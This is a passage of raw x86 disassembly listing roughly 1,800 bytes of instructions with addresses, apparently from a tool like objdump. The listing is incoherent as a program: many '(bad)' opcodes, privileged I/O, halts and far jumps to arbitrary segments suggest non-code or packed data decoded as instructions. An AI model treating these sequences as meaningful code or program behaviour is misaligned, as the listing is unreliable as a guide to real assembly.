  41ae5c:	xor    eax,0xc40c5332
  41ae61:	adc    al,ah
  41ae63:	xchg   esi,eax
  41ae64:	dec    esi
  41ae65:	mov    cl,0xa1
  41ae67:	and    ecx,DWORD PTR [ecx+eax*8+0x75]
  41ae6b:	inc    eax
  41ae6c:	dec    ecx
  41ae6d:	idiv   dh
  41ae6f:	fs nop
  41ae71:	cmc    
  41ae72:	jo     0x41ae31
  41ae74:	(bad)
  41ae78:	(bad)  
  41ae79:	mov    dl,0xee
  41ae7b:	inc    eax
  41ae7c:	sar    bh,0x2f
  41ae7f:	ret    
  41ae80:	(bad)  
  41ae82:	aam    0xf
  41ae84:	sbb    edx,DWORD PTR [eax+0x69]
  41ae87:	mov    ebx,0x3ed5b2a9
  41ae8c:	out    dx,al
  41ae8d:	inc    ebx
  41ae8e:	jb     0x41ae75
  41ae90:	test   DWORD PTR [ebp-0x10],0x450dcb7c
  41ae97:	jl     0x41ae46
  41ae99:	push   ebp
  41ae9a:	inc    edi
  41ae9b:	xchg   ecx,eax
  41ae9c:	jbe    0x41aef5
  41ae9e:	enter  0xb615,0x4d
  41aea2:	fisubr DWORD PTR [edi+edx*2+0x3cc33215]
  41aea9:	lods   eax,DWORD PTR ds:[esi]
  41aeaa:	arpl   WORD PTR [ecx+ebp*8-0x8],di
  41aeae:	aad    0x48
  41aeb0:	popf   
  41aeb1:	adc    BYTE PTR [ebx+0x77],0x48
  41aeb5:	xchg   DWORD PTR [edi+0x5b],eax
  41aeb8:	lea    ecx,[ecx+0x54]
  41aebb:	stc    
  41aebc:	dec    eax
  41aebd:	mov    edx,edx
  41aebf:	cmp    al,0x51
  41aec1:	test   eax,0x21ed34fa
  41aec6:	enter  0xabe,0xa
  41aeca:	push   edx
  41aecb:	inc    esi
  41aecc:	xchg   ebp,eax
  41aecd:	aas    
  41aece:	xor    DWORD PTR [edx-0x1e],ebx
  41aed1:	aad    0x42
  41aed3:	push   ebp
  41aed4:	mov    ds:0x863ac99c,al
  41aed9:	adc    eax,DWORD PTR [bp+si-0x2f37]
  41aede:	sbb    cl,BYTE PTR [edi-0x4b]
  41aee1:	mov    BYTE PTR [esi+ebx*1+0x79],cl
  41aee5:	sbb    esi,DWORD PTR [edi-0x88afc90]
  41aeeb:	cli    
  41aeec:	inc    ecx
  41aeed:	mov    cl,0xbb
  41aeef:	cmc    
  41aef0:	xor    bl,dl
  41aef2:	xor    ebp,DWORD PTR [ecx+0x268685a6]
  41aef8:	push   ss
  41aef9:	loopne 0x41ae7c
  41aefb:	push   0xef07ecd2
  41af00:	pop    esi
  41af01:	jae    0x41af0f
  41af03:	pop    esi
  41af04:	xchg   esp,ebp
  41af06:	push   edi
  41af07:	test   edi,0x807f37e6
  41af0d:	jae    0x41aea7
  41af0f:	push   esp
  41af10:	xchg   esi,eax
  41af11:	pop    esp
  41af12:	mov    esi,0xa4a854cd
  41af17:	mov    dh,al
  41af19:	mov    dl,0x4b
  41af1b:	add    DWORD PTR [eax+edi*4-0x1bfec179],esp
  41af22:	mov    esp,0xb656d804
  41af27:	das    
  41af28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af29:	mov    WORD PTR [edi],?
  41af2b:	loope  0x41af99
  41af2d:	sub    cl,bh
  41af2f:	push   edi
  41af30:	cli    
  41af31:	push   0xe6a55ce3
  41af36:	arpl   sp,ax
  41af38:	shl    edi,1
  41af3a:	and    edx,DWORD PTR [edi]
  41af3c:	push   ebx
  41af3d:	cmovno esp,edx
  41af40:	dec    edi
  41af41:	sbb    BYTE PTR [edx+0x62],0x9b
  41af45:	loop   0x41af6a
  41af47:	ror    DWORD PTR [eax+edi*2],1
  41af4a:	test   DWORD PTR [esi+0x4e],edx
  41af4d:	(bad)  
  41af4e:	push   cs
  41af4f:	push   ds
  41af50:	jmp    0x41af53
  41af52:	xchg   edx,eax
  41af53:	inc    edi
  41af54:	fld1   
  41af56:	dec    esi
  41af57:	jmp    0x2bda:0xe24e35cb
  41af5e:	dec    ebx
  41af5f:	dec    esp
  41af60:	pop    ebx
  41af61:	(bad)  
  41af62:	repnz fidiv WORD PTR [esi]
  41af65:	dec    ecx
  41af66:	jo     0x41af0a
  41af68:	cmc    
  41af69:	add    esp,esi
  41af6b:	jnp    0x41af3a
  41af6d:	pop    ss
  41af6e:	fwait
  41af6f:	pop    ebp
  41af70:	test   BYTE PTR ss:[ebp-0x66],0x58
  41af75:	dec    ebx
  41af76:	test   DWORD PTR [eax+ebp*4],esi
  41af79:	jmp    0x1675:0x54ec77e7
  41af80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af81:	scas   eax,DWORD PTR es:[edi]
  41af82:	and    edx,DWORD PTR [edi]
  41af84:	add    BYTE PTR [eax+0x36],dh
  41af87:	add    BYTE PTR [edi-0x14],dl
  41af8a:	(bad)  
  41af8b:	lds    esp,FWORD PTR [ebp+0x4b9a37f6]
  41af91:	push   0x5a
  41af93:	iret   
  41af94:	adc    bl,BYTE PTR [ecx]
  41af96:	jmp    0x41b00d
  41af98:	lea    ebp,[edx-0x3d]
  41af9b:	aad    0xa1
  41af9d:	xor    BYTE PTR [edi],dl
  41af9f:	mov    cl,0x3
  41afa1:	or     esp,edi
  41afa3:	push   0x5b7bdf39
  41afa8:	push   esp
  41afa9:	rol    DWORD PTR [ebp-0x360c4259],0xd0
  41afb0:	mov    BYTE PTR [edi],ah
  41afb2:	push   ss
  41afb3:	hlt    
  41afb4:	ror    bh,cl
  41afb6:	xchg   esi,eax
  41afb7:	adc    eax,0x5b0f9
  41afbc:	repnz stc 
  41afbe:	mov    ds:0x4c8a6b9d,al
  41afc3:	xor    DWORD PTR [edx],ebp
  41afc5:	or     al,0xda
  41afc7:	test   eax,0xcaa53a38
  41afcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afcd:	inc    esi
  41afce:	jns    0x41afa7
  41afd0:	cld    
  41afd1:	cli    
  41afd2:	push   esi
  41afd3:	add    eax,0x1104da7
  41afd8:	ja     0x41af9a
  41afda:	fs jmp 0x7b43:0xa3b4b370
  41afe2:	cmp    BYTE PTR [esp+ebp*4-0x386916c6],dh
  41afe9:	xor    esi,DWORD PTR [edx]
  41afeb:	cdq    
  41afec:	int    0x12
  41afee:	or     dh,BYTE PTR [esi-0x7e]
  41aff1:	hlt    
  41aff2:	test   BYTE PTR [edi+0x673eca1a],ah
  41aff8:	dec    ebx
  41aff9:	addr16 daa 
  41affb:	aas    
  41affc:	mov    cl,cl
  41affe:	jle    0x41b05d
  41b000:	mov    al,ds:0x6ac5d212
  41b005:	mov    ebx,0x231b5b2
  41b00a:	(bad)  
  41b00b:	outs   dx,BYTE PTR ds:[esi]
  41b00c:	mov    dl,0x39
  41b00e:	cmp    ebx,ebp
  41b010:	cmp    eax,0x9cd4522d
  41b015:	sbb    DWORD PTR [ebx-0x55cfe5a6],0x5b
  41b01c:	fiadd  WORD PTR [ecx+0x22]
  41b01f:	inc    edx
  41b020:	mov    DWORD PTR [edx-0x1a85a2ae],ebp
  41b026:	mov    ds:0xa67472e,al
  41b02b:	pop    edx
  41b02c:	stos   DWORD PTR es:[edi],eax
  41b02d:	cmp    al,0x7e
  41b02f:	add    DWORD PTR [edi],ecx
  41b031:	sub    ch,ah
  41b033:	jno    0x41b014
  41b035:	mov    dh,0x69
  41b037:	mov    cl,0x5b
  41b039:	and    al,0x25
  41b03c:	test   esp,ecx
  41b03e:	xchg   edi,eax
  41b03f:	(bad)  
  41b040:	enter  0xbcef,0xd2
  41b044:	test   BYTE PTR [ebx],dh
  41b046:	(bad)  
  41b047:	out    0xd4,eax
  41b049:	icebp  
  41b04a:	inc    ecx
  41b04b:	pop    eax
  41b04c:	sub    BYTE PTR [ebx],ch
  41b04e:	and    eax,0x38f2e6ea
  41b053:	or     esp,edi
  41b055:	fdiv   DWORD PTR [edx-0x655c2544]
  41b05b:	inc    eax
  41b05c:	jns    0x41b073
  41b05e:	aam    0x90
  41b060:	pop    ecx
  41b061:	mov    ebp,0x2799a3cf
  41b066:	das    
  41b067:	push   0x24
  41b069:	push   ss
  41b06a:	repnz cdq 
  41b06c:	(bad)  
  41b06d:	cmp    al,BYTE PTR [esp+ecx*1-0x776f90ad]
  41b074:	or     al,0x8d
  41b076:	rcl    BYTE PTR [ecx+ebp*2-0x270fed27],0xb3
  41b07e:	ins    BYTE PTR es:[edi],dx
  41b07f:	std    
  41b080:	add    eax,0x3fb7c532
  41b085:	dec    ebx
  41b086:	clc    
  41b087:	stos   BYTE PTR es:[edi],al
  41b088:	push   esi
  41b089:	inc    ebx
  41b08a:	mov    dl,0x78
  41b08c:	adc    BYTE PTR [edx],0x8b
  41b08f:	mov    edi,0x3b0b738d
  41b094:	ja     0x41b0ac
  41b096:	dec    eax
  41b097:	je     0x41b0ad
  41b099:	cmp    al,0x29
  41b09b:	mov    ebx,0xe0c8f2c9
  41b0a0:	test   DWORD PTR [esi-0x3bbc5aba],0xe8adbd72
  41b0aa:	not    al
  41b0ac:	sbb    BYTE PTR [ecx-0x220ce346],al
  41b0b2:	or     al,0x37
  41b0b4:	lahf   
  41b0b5:	hlt    
  41b0b6:	icebp  
  41b0b7:	jmp    0x9d3bcc2f
  41b0bc:	inc    esp
  41b0bd:	in     eax,dx
  41b0be:	adc    ecx,DWORD PTR [edi-0x29]
  41b0c1:	jne    0x41b121
  41b0c3:	mov    ecx,0x76a3423b
  41b0c8:	xor    al,0xef
  41b0ca:	mul    BYTE PTR [edx]
  41b0cc:	xchg   edi,eax
  41b0cd:	retf   0x88c5
  41b0d0:	push   cs
  41b0d1:	cdq    
  41b0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0d3:	stc    
  41b0d4:	enter  0x3d3a,0xf4
  41b0d8:	popa   
  41b0d9:	mov    cl,0x81
  41b0db:	mov    WORD PTR [esi-0x55],ds
  41b0de:	retf   0xa71e
  41b0e1:	and    al,0x4c
  41b0e3:	shr    BYTE PTR [esi-0x30],cl
  41b0e6:	mov    eax,ds:0xe1013581
  41b0eb:	mov    ds,WORD PTR [esp+ebp*4]
  41b0ee:	scas   eax,DWORD PTR es:[edi]
  41b0ef:	lahf   
  41b0f0:	dec    eax
  41b0f1:	sar    DWORD PTR [ebp+0x65],0xfb
  41b0f5:	in     eax,dx
  41b0f6:	mov    ds:0x11fc0dd7,al
  41b0fb:	mov    ?,WORD PTR [ecx-0x2b9f5409]
  41b101:	(bad)  
  41b103:	xchg   DWORD PTR [eax+0x7a],esi
  41b106:	add    cl,ch
  41b108:	mov    ah,0xb3
  41b10a:	mov    esp,0xfdd38556
  41b10f:	fdivr  st,st(7)
  41b111:	(bad)  
  41b112:	mov    edi,0x74dbcd84
  41b117:	mov    edx,0x58e81270
  41b11c:	push   ds
  41b11d:	sbb    DWORD PTR [ebx+0x6972539b],0xffffffc1
  41b124:	retf   
  41b125:	adc    DWORD PTR [edi+0x23],eax
  41b128:	add    dl,ch
  41b12a:	nop
  41b12b:	dec    eax
  41b12c:	adc    dl,BYTE PTR [ebx]
  41b12e:	mov    ss,ecx
  41b130:	sbb    BYTE PTR [esi+0x1c8b4963],bl
  41b136:	dec    esp
  41b137:	sub    al,0x1d
  41b139:	cli    
  41b13a:	jno    0x41b14e
  41b13c:	sbb    BYTE PTR [esp+esi*8-0x1673cb13],dl
  41b143:	push   eax
  41b144:	sar    DWORD PTR [ebx-0x6d],0x3d
  41b148:	fst    QWORD PTR gs:[edx]
  41b14b:	mov    DWORD PTR [ebx+0x16],edx
  41b14e:	call   0x34554af
  41b153:	gs stos DWORD PTR es:[edi],eax
  41b155:	fwait
  41b156:	pop    esi
  41b157:	sbb    DWORD PTR [eax],ebp
  41b159:	lock adc al,0x66
  41b15c:	add    BYTE PTR [edx+0x4d],dh
  41b15f:	and    eax,0xcbeb8f27
  41b164:	mov    fs,WORD PTR [esi-0x753c3b9d]
  41b16a:	xor    cl,BYTE PTR [ebp-0x3a]
  41b16d:	mov    cl,0x95
  41b16f:	in     eax,dx
  41b170:	inc    ecx
  41b171:	cmp    ah,BYTE PTR [ecx]
  41b173:	dec    edi
  41b174:	(bad)  
  41b175:	shl    DWORD PTR [edi-0x2ddcfed5],1
  41b17b:	xor    BYTE PTR [edx],0x88
  41b17e:	sbb    DWORD PTR [eax+0x148c8084],0x18311c21
  41b188:	inc    ecx
  41b189:	add    BYTE PTR [edx+edx*8],0x0
  41b18d:	ret    0x9ac0
  41b190:	jmp    DWORD PTR ds:0x548b570e
  41b196:	mov    BYTE PTR [edx-0x3b],ch
  41b199:	push   esi
  41b19a:	push   cs
  41b19b:	(bad)  
  41b19c:	out    dx,eax
  41b19d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b19e:	in     eax,dx
  41b19f:	cmp    ah,ah
  41b1a1:	pop    ss
  41b1a2:	stc    
  41b1a3:	or     al,0xaf
  41b1a5:	ffreep st(3)
  41b1a7:	push   ebp
  41b1a8:	fdivr  QWORD PTR [edi+0x3a]
  41b1ab:	dec    esp
  41b1ac:	pop    es
  41b1ad:	push   ecx
  41b1ae:	pop    ebp
  41b1af:	add    ecx,DWORD PTR [eax]
  41b1b1:	iret   
  41b1b2:	add    eax,0xc0737d4b
  41b1b7:	loopne 0x41b1cd
  41b1b9:	push   ecx
  41b1ba:	lods   eax,DWORD PTR ds:[esi]
  41b1bb:	lds    edi,FWORD PTR [ecx+0x6948cd6e]
  41b1c1:	dec    edx
  41b1c2:	pop    es
  41b1c3:	pop    ds
  41b1c4:	imul   DWORD PTR [esi+0x76b82361]
  41b1ca:	div    DWORD PTR [esi]
  41b1cc:	js     0x41b1f0
  41b1ce:	pop    edi
  41b1cf:	or     BYTE PTR ds:0xeb9792de,ah
  41b1d5:	aaa    
  41b1d6:	dec    ebx
  41b1d7:	shl    dh,0x20
  41b1da:	test   BYTE PTR [eax-0xa318201],0x9c
  41b1e1:	je     0x41b21d
  41b1e3:	xor    al,0xd3
  41b1e5:	jae    0x41b237
  41b1e7:	push   esp
  41b1e8:	adc    DWORD PTR [edx],0xffffffc8
  41b1eb:	or     al,0x32
  41b1ed:	(bad)  
  41b1ee:	stc    
  41b1ef:	xor    DWORD PTR [edx-0x3d],0x9f84ece2
  41b1f6:	fdiv   QWORD PTR ss:[edi+esi*8]
  41b1fa:	dec    ecx
  41b1fb:	arpl   WORD PTR [edi],si
  41b1fd:	int    0x9
  41b1ff:	jo     0x41b1b8
  41b201:	dec    ecx
  41b202:	popa   
  41b203:	cwde   
  41b204:	sbb    eax,ebp
  41b206:	ds sub al,0xa3
  41b209:	jbe    0x41b230
  41b20b:	dec    ebx
  41b20c:	sub    esp,DWORD PTR [esi+0x721675f1]
  41b212:	pop    ss
  41b213:	sbb    esi,DWORD PTR ds:0x51d97397
  41b219:	popf   
  41b21a:	inc    eax
  41b21b:	in     eax,0x17
  41b21d:	jmp    0x41b1f8
  41b21f:	imul   edi,DWORD PTR [eax],0x950b86ad
  41b225:	sub    eax,0x736aeb07
  41b22a:	sub    al,0x13
  41b22c:	jmp    0xa3a6:0xce2d7ede
  41b233:	mov    eax,ds:0x29cb98dc
  41b238:	push   cs
  41b239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b23a:	into   
  41b23b:	jl     0x41b261
  41b23d:	pushf  
  41b23e:	dec    esp
  41b23f:	jp     0x41b22b
  41b241:	and    bl,BYTE PTR [ecx-0x3]
  41b244:	loope  0x41b254
  41b246:	cld    
  41b247:	fstp   TBYTE PTR [edi-0x5a]
  41b24a:	sub    ecx,ecx
  41b24c:	fiadd  WORD PTR [ebx+ecx*2]
  41b24f:	fcmovbe st,st(6)
  41b251:	and    BYTE PTR [edi],bh
  41b253:	pop    es
  41b254:	inc    ebx
  41b255:	cmc    
  41b256:	jge    0x41b2ce
  41b258:	push   es
  41b259:	loope  0x41b1f1
  41b25b:	sub    esp,0x35467e42
  41b261:	push   ecx
  41b262:	xchg   ebp,eax
  41b263:	mov    al,0xff
  41b265:	push   edi
  41b266:	xlat   BYTE PTR ds:[ebx]
  41b267:	fnstcw WORD PTR [eax+0x5e6670e7]
  41b26d:	fidivr DWORD PTR [edx]
  41b26f:	ds sti 
  41b271:	xlat   BYTE PTR ds:[ebx]
  41b272:	push   DWORD PTR [esi-0x1e]
  41b275:	mov    al,0x3d
  41b277:	cmp    edx,DWORD PTR [edx-0x43]
  41b27a:	mov    cl,BYTE PTR [esi-0x74dee95]
  41b280:	dec    ebx
  41b281:	out    0xd0,al
  41b283:	xchg   esp,eax
  41b284:	pop    ss
  41b285:	xchg   ecx,eax
  41b286:	cmc    
  41b287:	and    dl,BYTE PTR [eax-0x10]
  41b28a:	push   ecx
  41b28b:	add    BYTE PTR [ebx+ebp*8-0x37],ah
  41b28f:	ja     0x41b27c
  41b291:	adc    DWORD PTR [edx+0x1084fc63],esp
  41b297:	(bad)  
  41b298:	fldcw  WORD PTR [ebp+0x2a]
  41b29b:	ds xor al,0xe6
  41b29e:	dec    esp
  41b29f:	cmp    dl,ah
  41b2a1:	shl    BYTE PTR [ebx-0x56c85062],0xbc
  41b2a8:	data16 add bh,BYTE PTR [ecx]
  41b2ab:	call   0x2389:0xbf10a566
  41b2b2:	pop    edi
  41b2b3:	gs je  0x41b26e
  41b2b6:	jnp    0x41b335
  41b2b8:	dec    ecx
  41b2b9:	test   BYTE PTR fs:[edx-0x3a],bh
  41b2bd:	retf   0x3e4
  41b2c0:	out    0xa9,al
  41b2c2:	inc    ebx
  41b2c3:	push   DWORD PTR [edi]
  41b2c5:	push   edx
  41b2c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2c7:	xchg   esp,eax
  41b2c8:	xchg   ebx,eax
  41b2c9:	fsubr  st,st(2)
  41b2cb:	push   edx
  41b2cc:	xchg   edi,eax
  41b2cd:	lods   eax,DWORD PTR ds:[esi]
  41b2ce:	pop    ebp
  41b2cf:	jg     0x41b301
  41b2d1:	mov    edi,0x63c948be
  41b2d6:	dec    ecx
  41b2d7:	repnz mov edx,ecx
  41b2da:	or     DWORD PTR ds:0x12102e1f,0x50
  41b2e1:	add    eax,0xa66a69e5
  41b2e6:	imul   edx,DWORD PTR [edi],0x943bd043
  41b2ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2ed:	mov    bl,0x8a
  41b2ef:	pop    esi
  41b2f0:	fucomi st,st(0)
  41b2f2:	in     eax,0x40
  41b2f4:	mov    al,0x67
  41b2f6:	jne    0x41b2a8
  41b2f8:	inc    ebx
  41b2f9:	xchg   DWORD PTR [edx-0x3bebf0c3],ebx
  41b2ff:	inc    ebp
  41b300:	inc    esi
  41b301:	nop
  41b302:	and    ah,BYTE PTR [edi+0x33c9c7f]
  41b308:	inc    ebx
  41b309:	jno    0x41b2cd
  41b30b:	mov    al,ds:0x90284583
  41b310:	test   al,0x41
  41b312:	inc    esi
  41b313:	jne    0x41b296
  41b315:	std    
  41b316:	pop    esp
  41b317:	test   eax,0x1d3ab59
  41b31c:	xor    BYTE PTR [eax+eiz*1],al
  41b31f:	je     0x41b34b
  41b321:	bound  ecx,QWORD PTR [ebp+0x6b4edf5f]
  41b327:	mov    dh,0xc2
  41b329:	fdivr  QWORD PTR [esi-0x7]
  41b32c:	sub    edi,DWORD PTR [ebx]
  41b32e:	les    ecx,FWORD PTR [esp+edx*4]
  41b331:	neg    esi
  41b333:	cmp    al,0xa2
  41b335:	or     DWORD PTR [ebx+0x4a],ebx
  41b338:	scas   al,BYTE PTR es:[edi]
  41b339:	add    DWORD PTR [ebx+0x1],edi
  41b33c:	test   DWORD PTR [ecx+0x35c630ed],0x5501f071
  41b346:	clc    
  41b347:	nop
  41b348:	and    edi,DWORD PTR [ebx]
  41b34a:	adc    BYTE PTR [ecx],dh
  41b34c:	dec    esi
  41b34d:	or     al,bl
  41b34f:	call   0x8a0d:0xd8e9d3c8
  41b356:	cli    
  41b357:	fwait
  41b358:	dec    ebx
  41b359:	(bad)  
  41b35a:	mov    al,0xd8
  41b35c:	push   ebx
  41b35d:	inc    edx
  41b35e:	lock sub al,BYTE PTR [ecx-0x3b]
  41b362:	xchg   esp,eax
  41b363:	sub    edx,DWORD PTR [edi]
  41b365:	pop    ebp
  41b366:	mov    edx,0xa1bd1980
  41b36b:	dec    esp
  41b36c:	xchg   esp,eax
  41b36d:	xor    ah,0xc2
  41b370:	cli    
  41b371:	popa   
  41b372:	in     eax,dx
  41b373:	cld    
  41b374:	sub    eax,0x221bef25
  41b379:	call   0xa0bc012b
  41b37e:	das    
  41b37f:	out    0x28,eax
  41b381:	loop   0x41b3c4
  41b383:	arpl   WORD PTR [ebx+esi*8],di
  41b386:	js     0x41b3f8
  41b388:	push   eax
  41b389:	push   ds
  41b38a:	inc    esp
  41b38b:	sbb    al,BYTE PTR [eax]
  41b38d:	pop    eax
  41b38e:	jg     0x41b3fa
  41b390:	scas   eax,DWORD PTR es:[edi]
  41b391:	nop
  41b392:	pop    ebx
  41b393:	push   0xffffffbd
  41b395:	outs   dx,DWORD PTR ds:[esi]
  41b396:	jecxz  0x41b407
  41b398:	js     0x41b393
  41b39a:	scas   eax,DWORD PTR es:[edi]
  41b39b:	add    ebp,ebx
  41b39d:	xchg   ecx,eax
  41b39e:	jae    0x41b3f0
  41b3a0:	sub    DWORD PTR fs:[ecx],edx
  41b3a3:	jmp    0x75c3:0x8906a68f
  41b3aa:	daa    
  41b3ab:	fisub  DWORD PTR [edx+eiz*1+0x5d]
  41b3af:	pop    es
  41b3b0:	lock ins DWORD PTR es:[edi],dx
  41b3b2:	fnsave [edx-0x7fd3b5c8]
  41b3b8:	mov    fs,WORD PTR [edx-0x14]
  41b3bb:	jg     0x41b3cf
  41b3bd:	ds dec esp
  41b3bf:	in     al,0x1f
  41b3c1:	out    0x1c,al
  41b3c3:	arpl   WORD PTR [esi-0x36],sp
  41b3c6:	push   cs
  41b3c7:	jne    0x41b411
  41b3c9:	scas   eax,DWORD PTR es:[edi]
  41b3ca:	aad    0x3b
  41b3cc:	cmp    al,0x26
  41b3ce:	call   0xae622354
  41b3d3:	test   al,0x86
  41b3d5:	sub    bh,ah
  41b3d7:	loop   0x41b3e5
  41b3d9:	add    al,0xe2
  41b3db:	fdiv   st(1),st
  41b3dd:	mov    ds:0xb88de800,eax
  41b3e2:	xor    DWORD PTR [edi+0x533651ff],edi
  41b3e8:	xor    BYTE PTR ds:0x51690194,bl
  41b3ee:	in     al,dx
  41b3ef:	cmp    BYTE PTR [ebx-0x30],ch
  41b3f2:	iret   
  41b3f3:	lea    eax,[edx+ebx*8+0x54]
  41b3f7:	pop    edi
  41b3f8:	sbb    DWORD PTR [eax+0x48fadd2d],ecx
  41b3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ff:	jmp    0x41b427
  41b401:	inc    esi
  41b402:	sbb    BYTE PTR [eax-0x65],ah
  41b405:	fsubr  QWORD PTR [ebx+ebp*4-0x63]
  41b409:	xor    DWORD PTR [eax+0x1ca0ab85],eax
  41b40f:	rcl    BYTE PTR [esi+0x5a],1
  41b412:	adc    eax,0x830c6015
  41b417:	jo     0x41b402
  41b419:	loopne 0x41b414
  41b41b:	fist   DWORD PTR [edx+0x28]
  41b41e:	rol    BYTE PTR [esi-0x31b37366],1
  41b424:	test   al,0x3a
  41b426:	jg     0x41b436
  41b428:	imul   eax,DWORD PTR [ecx+0x71],0xffffffc2
  41b42c:	jbe    0x41b412
  41b42e:	jmp    0x23d2:0xd7a65f98
  41b435:	test   edx,0xf058b210
  41b43b:	mov    ah,0x61
  41b43d:	rcr    BYTE PTR [eax-0x3b],0x7d
  41b441:	inc    ebp
  41b442:	xchg   BYTE PTR [edx+0x2a0da895],cl
  41b448:	push   ecx
  41b449:	mov    cs,WORD PTR [ebp+0x38]
  41b44c:	pop    ecx
  41b44d:	mov    ax,0x90a4
  41b451:	inc    eax
  41b452:	push   edx
  41b453:	xchg   edx,eax
  41b454:	int3   
  41b455:	adc    DWORD PTR [esi+0x2d],esp
  41b458:	jmp    0x41b4bd
  41b45a:	cmp    cl,BYTE PTR [ecx]
  41b45c:	sbb    DWORD PTR [esi+0x37],eax
  41b45f:	(bad)  
  41b461:	jns    0x41b4c9
  41b463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b464:	iret   
  41b465:	int3   
  41b466:	push   ecx
  41b467:	in     al,0xfb
  41b469:	adc    al,0xe8
  41b46b:	mov    eax,0xc9741729
  41b470:	loopne 0x41b49a
  41b472:	xor    eax,0x48147146
  41b477:	and    BYTE PTR [ebx],0x1e
  41b47a:	push   0x21
  41b47c:	dec    ecx
  41b47d:	out    dx,eax
  41b47e:	pop    ebx
  41b47f:	sbb    BYTE PTR [ecx+0x2],bh
  41b482:	psubb  mm0,QWORD PTR [edx-0x16]
  41b486:	mov    bl,0x50
  41b488:	jle    0x41b45f
  41b48a:	int3   
  41b48b:	jo     0x41b4f1
  41b48d:	jl     0x41b47d
  41b48f:	jae    0x41b4ab
  41b491:	hlt    
  41b492:	xchg   edx,eax
  41b493:	(bad)  
  41b494:	jae    0x41b4b9
  41b496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b497:	sbb    DWORD PTR [ecx],esi
  41b499:	mov    al,ds:0x6f453c45
  41b49e:	mov    al,0xd1
  41b4a0:	aam    0xea
  41b4a2:	in     eax,dx
  41b4a3:	dec    edi
  41b4a4:	mov    al,0x3a
  41b4a6:	and    eax,0x35bd1ae9
  41b4ab:	mov    ch,0x4a
  41b4ad:	cmp    bh,BYTE PTR [edi-0x62]
  41b4b0:	lock cmp DWORD PTR [edx-0x2648de31],edx
  41b4b7:	mov    edx,0x2e7b91d5
  41b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4bd:	dec    eax
  41b4be:	or     bl,bh
  41b4c0:	into   
  41b4c1:	xlat   BYTE PTR ds:[ebx]
  41b4c2:	hlt    
  41b4c3:	dec    ecx
  41b4c4:	sub    DWORD PTR [eax+edx*4+0x34],esp
  41b4c8:	fs fucom st(4)
  41b4cb:	or     DWORD PTR [ebx+0x70],0x55b85db2
  41b4d2:	aas    
  41b4d3:	pop    eax
  41b4d4:	push   es
  41b4d5:	je     0x41b47d
  41b4d7:	or     edx,DWORD PTR [esi]
  41b4d9:	aaa    
  41b4da:	sar    eax,1
  41b4dc:	xchg   esp,eax
  41b4dd:	mov    eax,0x3e4d7347
  41b4e2:	aad    0x50
  41b4e4:	push   es
  41b4e5:	push   esp
  41b4e6:	inc    edx
  41b4e7:	mov    ecx,0x24e8748d
  41b4ec:	and    bl,BYTE PTR [esi+0x5d]
  41b4ef:	cmp    DWORD PTR [edx+0x4d],eax
  41b4f2:	mov    ebp,DWORD PTR [ebx+0x10]
  41b4f5:	xchg   DWORD PTR [edx+0xb],esi
  41b4f8:	xor    DWORD PTR [edi],ebx
  41b4fa:	dec    esi
  41b4fb:	mov    al,0x42
  41b4fd:	cmp    ebx,0xf9f159a6
  41b503:	push   edi
  41b504:	iret   
  41b505:	add    DWORD PTR [eax*2-0x690d7663],edx
  41b50c:	jns    0x41b4d5
  41b50e:	mov    ah,0x86
  41b510:	outs   dx,DWORD PTR ds:[esi]
  41b511:	cdq    
  41b512:	outs   dx,DWORD PTR ds:[esi]
  41b513:	push   ds
  41b514:	xor    edx,DWORD PTR [esi]
  41b516:	mov    cl,0xe0
  41b518:	stos   BYTE PTR es:[edi],al
  41b519:	inc    esp
  41b51a:	jmp    0xf03a:0xbe1dab3
  41b521:	into   
  41b522:	sub    al,BYTE PTR [ebx-0x29]
  41b525:	add    ebx,esp
  41b527:	mov    esp,0x28f6cb6f
  41b52c:	mov    dl,ch
  41b52e:	dec    ebx
  41b52f:	pop    ecx
  41b530:	scas   eax,DWORD PTR es:[edi]
  41b531:	jmp    0xf64e:0x54fc36c6
  41b538:	imul   esp,DWORD PTR [edx+ebp*1],0x61fa28b3
  41b53f:	adc    dl,0x66
  41b542:	in     eax,dx
  41b543:	cld    
  41b544:	xchg   esp,eax
  41b545:	ss out 0xfb,eax
  41b548:	ret    0x7334
  41b54b:	cli    
  41b54c:	adc    bl,BYTE PTR [ebx+0x2]
  41b54f:	mov    al,ds:0x2cdaed8a
  41b554:	inc    ecx
  41b555:	cdq    
  41b556:	dec    esi
  41b557:	push   ecx
  41b558:	xlat   BYTE PTR ds:[ebx]
  41b559:	lock cmp edx,DWORD PTR [esi+0x68871556]
  41b560:	fld    DWORD PTR [eax+ebx*8-0x62]
  41b564:	mov    ah,0x60
  41b566:	ja     0x41b540
  41b568:	sbb    al,0x52
  41b56a:	shl    BYTE PTR [edx-0x33a21759],0xe1
  41b571:	test   eax,0x206b09a5
  41b576:	ds jle 0x41b5bf
  41b579:	and    eax,0x6d888873
  41b57e:	mov    ch,0x10
  41b580:	lock fdiv st,st(4)
  41b583:	xor    dl,ah
  41b585:	mov    bl,0x95
  41b587:	or     ah,BYTE PTR [esi]
  41b589:	hlt    
  41b58a:	xor    bh,BYTE PTR [ecx-0x11]
  41b58d:	xor    esi,DWORD PTR [eax]
  41b58f:	xor    eax,0xad026463
  41b594:	or     al,0x18
  41b596:	fwait
  41b597:	xchg   BYTE PTR [ecx],dl
  41b599:	ret    0xa07b
  41b59c:	jbe    0x41b597
  41b59e:	rol    BYTE PTR [eax+0x73d03303],cl
  41b5a4:	inc    eax
  41b5a5:	push   esi
  41b5a6:	cdq    
  41b5a7:	mov    bh,0x4b
  41b5a9:	sti    
  41b5aa:	stos   BYTE PTR es:[edi],al
  41b5ab:	icebp  
  41b5ac:	jle    0x41b61c
  41b5ae:	sub    eax,0x839b8a2a
  41b5b3:	pop    edx
  41b5b4:	xchg   edx,eax
